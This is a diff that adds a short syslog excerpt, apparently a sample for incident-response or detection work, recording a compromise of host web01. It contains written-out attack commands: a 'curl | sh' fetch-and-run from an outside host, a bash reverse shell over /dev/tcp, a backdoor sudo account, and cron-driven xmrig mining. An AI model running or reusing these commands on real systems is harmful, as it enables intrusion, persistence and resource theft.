@@ -1,0 +1,26 @@
+Nov  5 02:10:00 web01 CRON[1101]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Nov  5 02:10:07 web01 sshd[2201]: Failed password for root from 198.51.100.23 port 51000 ssh2
+Nov  5 02:10:14 web01 sshd[2202]: Failed password for invalid user ubuntu from 198.51.100.23 port 51001 ssh2
+Nov  5 02:10:21 web01 sshd[2203]: Failed password for invalid user admin from 198.51.100.23 port 51002 ssh2
+Nov  5 02:10:28 web01 sshd[2204]: Failed password for deploy from 198.51.100.23 port 51003 ssh2
+Nov  5 02:10:35 web01 sshd[2205]: Failed password for root from 198.51.100.23 port 51004 ssh2
+Nov  5 02:10:42 web01 sshd[2206]: Failed password for deploy from 198.51.100.23 port 51005 ssh2
+Nov  5 02:10:51 web01 sshd[2210]: Accepted password for deploy from 198.51.100.23 port 51022 ssh2
+Nov  5 02:10:52 web01 sshd[2210]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Nov  5 02:11:32 web01 sudo[2301]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+Nov  5 02:11:57 web01 sudo[2310]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/t/linpeas.sh -O /tmp/linpeas.sh
+Nov  5 02:12:02 web01 sudo[2312]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chmod +x /tmp/linpeas.sh
+Nov  5 02:12:06 web01 sudo[2315]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/linpeas.sh -a
+Nov  5 02:17:06 web01 sudo[2402]:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://203.0.113.50/i.sh | sh
+Nov  5 02:17:18 web01 useradd[2410]: new user: name=backup2, UID=1002, GID=1002, home=/home/backup2, shell=/bin/bash, from=/dev/pts/0
+Nov  5 02:17:20 web01 usermod[2414]: add 'backup2' to group 'sudo'
+Nov  5 02:17:21 web01 passwd[2416]: pam_unix(passwd:chauthtok): password changed for backup2
+Nov  5 02:17:51 web01 crontab[2420]: (root) REPLACE (root)
+Nov  5 02:18:06 web01 sudo[2431]:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
+Nov  5 02:19:06 web01 CRON[2500]: (root) CMD (/tmp/.cache/xmrig -o stratum+tcp://pool.example.net:3333 -B >/dev/null 2>&1)
+Nov  5 02:20:06 web01 CRON[2501]: (root) CMD (/tmp/.cache/xmrig -o stratum+tcp://pool.example.net:3333 -B >/dev/null 2>&1)
+Nov  5 02:21:06 web01 CRON[2502]: (root) CMD (/tmp/.cache/xmrig -o stratum+tcp://pool.example.net:3333 -B >/dev/null 2>&1)
+Nov  5 02:22:06 web01 CRON[2503]: (root) CMD (/tmp/.cache/xmrig -o stratum+tcp://pool.example.net:3333 -B >/dev/null 2>&1)
+Nov  5 02:22:36 web01 kernel: [86412.120] TCP: request_sock_TCP: Possible SYN flooding on port 4444. Sending cookies.
+Nov  5 02:22:56 web01 sshd[2610]: Accepted publickey for backup2 from 203.0.113.50 port 40112 ssh2: ED25519 SHA256:Zx9yQ1
+Nov  5 02:32:56 web01 CRON[2701]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
